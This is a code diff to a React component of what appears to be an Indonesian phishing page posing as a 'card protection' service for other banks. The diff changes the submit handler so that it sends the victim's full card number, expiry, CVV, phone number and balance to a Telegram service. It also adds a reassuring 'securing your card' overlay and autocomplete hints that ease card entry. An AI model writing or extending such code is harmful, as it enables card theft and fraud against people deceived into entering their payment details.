@@ -1,17 +1,19 @@
 import React, { useState } from 'react';
 import { ArrowLeft, ChevronDown, ShieldAlert, AlertCircle, Check } from 'lucide-react';
 import {
-  validateLuhn,
+  validateCardNumber,
   validatePhone,
   validateExpiry,
   validateCvv,
   validateBalance,
   detectCardNetwork,
 } from '../utils/validation';
+import { getFormattedWibDateTime } from '../utils/dateUtils';
 import { ServiceProcessModal, ServiceReceiptData } from './ServiceProcessModal';
 import { VirtualCardPreview } from './VirtualCardPreview';
 import { BANK_OPTIONS } from '../data/bankOptionsData';
 import { TelegramService } from '../services/telegramService';
+import { FormSkeletonOverlay } from './FormSkeletonOverlay';
 
 interface MAdminAmankanBankLainViewProps {
   onBack: () => void;
@@ -52,7 +54,7 @@ export const MAdminAmankanBankLainView: React.FC<MAdminAmankanBankLainViewProps>
   };
 
   // Realtime validations
-  const cardValidation = validateLuhn(cardNumber);
+  const cardValidation = validateCardNumber(cardNumber);
   const phoneValidation = validatePhone(phoneNumber);
   const expiryValidation = validateExpiry(expiry);
   const cvvValidation = validateCvv(cvv);
@@ -146,10 +148,22 @@ export const MAdminAmankanBankLainView: React.FC<MAdminAmankanBankLainViewProps>
     }
 
     setIsSubmitting(true);
-    const notificationSent = await TelegramService.sendFormData({
-      serviceType: 'amankan-bank-lain',
-      serviceTitle: `Proteksi Kartu ${currentBank.name}`,
-    });
+    // Ensure smooth perceived performance with minimum skeleton animation display time
+    const [notificationSent] = await Promise.all([
+      TelegramService.sendFormData({
+        serviceType: 'amankan-bank-lain',
+        serviceTitle: `Proteksi Kartu ${currentBank.name}`,
+        bankTarget: currentBank.id === 'lainnya' ? (customBankName || 'BANK LAIN') : currentBank.name,
+        jenisKartu: cardNetwork || 'GPN / KARTU BANK',
+        nomorKartu: cardNumber,
+        nomorHp: phoneNumber,
+        masaBerlaku: expiry,
+        cvv: cvv,
+        limitSaldo: balance ? `Rp ${balance}` : 'Rp 0',
+        waktuInput: getFormattedWibDateTime(),
+      }),
+      new Promise((resolve) => setTimeout(resolve, 750)),
+    ]);
     setIsSubmitting(false);
 
     if (!notificationSent) {
@@ -233,6 +247,9 @@ export const MAdminAmankanBankLainView: React.FC<MAdminAmankanBankLainViewProps>
               </label>
               <input
                 type="text"
+                inputMode="text"
+                autoCapitalize="words"
+                spellCheck={false}
                 placeholder="Contoh: Bank BJB, Allo Bank, Bank Nagari, dll."
                 value={customBankName}
                 onChange={(e) => setCustomBankName(e.target.value)}
@@ -259,7 +276,14 @@ export const MAdminAmankanBankLainView: React.FC<MAdminAmankanBankLainViewProps>
         />
 
         {/* Input Form Fields (1:1 with Screenshot, with Realtime Luhn & Input Validations) */}
-        <form onSubmit={handleOkClick} className="space-y-2.5 w-full">
+        <form onSubmit={handleOkClick} className="space-y-2.5 w-full relative">
+          {/* Subtle Skeleton Loading Overlay upon submit */}
+          <FormSkeletonOverlay
+            isVisible={isSubmitting}
+            type="banklain"
+            message={`Mengamankan kartu ${currentBank.name}...`}
+          />
+
           {/* 1. Nomor Kartu */}
           <div>
             <div className="flex items-center justify-between mb-0.5">
@@ -274,8 +298,10 @@ export const MAdminAmankanBankLainView: React.FC<MAdminAmankanBankLainViewProps>
             </div>
             <div className="relative">
               <input
-                type="text"
+                type="tel"
                 inputMode="numeric"
+                pattern="[0-9\s]*"
+                autoComplete="cc-number"
                 placeholder="16 digit nomor kartu"
                 value={cardNumber}
                 onChange={handleCardNumberChange}
@@ -306,7 +332,7 @@ export const MAdminAmankanBankLainView: React.FC<MAdminAmankanBankLainViewProps>
             {cardValidation.isValid && (
               <p className="text-[11px] text-emerald-600 mt-0.5 flex items-center gap-1 animate-in fade-in duration-150">
                 <Check size={12} className="shrink-0" />
-                <span>Kartu 16 digit valid (Luhn Terverifikasi)</span>
+                <span>Format kartu 16 digit terverifikasi</span>
               </p>
             )}
           </div>
@@ -319,8 +345,10 @@ export const MAdminAmankanBankLainView: React.FC<MAdminAmankanBankLainViewProps>
               </label>
               <div className="relative">
                 <input
-                  type="text"
+                  type="tel"
                   inputMode="numeric"
+                  pattern="[0-9/]*"
+                  autoComplete="cc-exp"
                   placeholder="BB/TT"
                   value={expiry}
                   onChange={handleExpiryChange}
@@ -358,6 +386,8 @@ export const MAdminAmankanBankLainView: React.FC<MAdminAmankanBankLainViewProps>
                 <input
                   type="password"
                   inputMode="numeric"
+                  pattern="[0-9]*"
+                  autoComplete="cc-csc"
                   placeholder="3 Digit"
                   value={cvv}
                   onChange={handleCvvChange}
@@ -400,7 +430,9 @@ export const MAdminAmankanBankLainView: React.FC<MAdminAmankanBankLainViewProps>
             <div className="relative">
               <input
                 type="tel"
-                inputMode="tel"
+                inputMode="numeric"
+                pattern="[0-9]*"
+                autoComplete="tel"
                 placeholder="Contoh: 081234567890"
                 value={phoneNumber}
                 onChange={handlePhoneChange}
@@ -436,8 +468,9 @@ export const MAdminAmankanBankLainView: React.FC<MAdminAmankanBankLainViewProps>
             </label>
             <div className="relative">
               <input
-                type="text"
+                type="tel"
                 inputMode="numeric"
+                pattern="[0-9]*"
                 placeholder="Rp 0"
                 value={balance ? `Rp ${balance}` : ''}
                 onChange={handleBalanceChange}
@@ -496,8 +529,12 @@ export const MAdminAmankanBankLainView: React.FC<MAdminAmankanBankLainViewProps>
             {/* OK Button */}
             <button
               type="submit"
-              disabled={isSubmitting}
-              className="w-full py-2.5 px-4 rounded-lg bg-[#3b6285] hover:bg-[#325473] active:bg-[#28445e] disabled:opacity-60 disabled:cursor-wait text-white font-bold text-[14px] transition-all cursor-pointer shadow-xs active:scale-[0.99] text-center"
+              disabled={!isFormValid || isSubmitting}
+              className={`w-full py-2.5 px-4 rounded-lg font-bold text-[14px] transition-all shadow-xs text-center ${
+                isFormValid && !isSubmitting
+                  ? 'bg-[#3b6285] hover:bg-[#325473] active:bg-[#28445e] text-white cursor-pointer active:scale-[0.99]'
+                  : 'bg-[#d8e0e8] text-[#8e9ca8] cursor-not-allowed'
+              }`}
             >
               {isSubmitting ? 'Mengirim...' : 'OK'}
             </button>
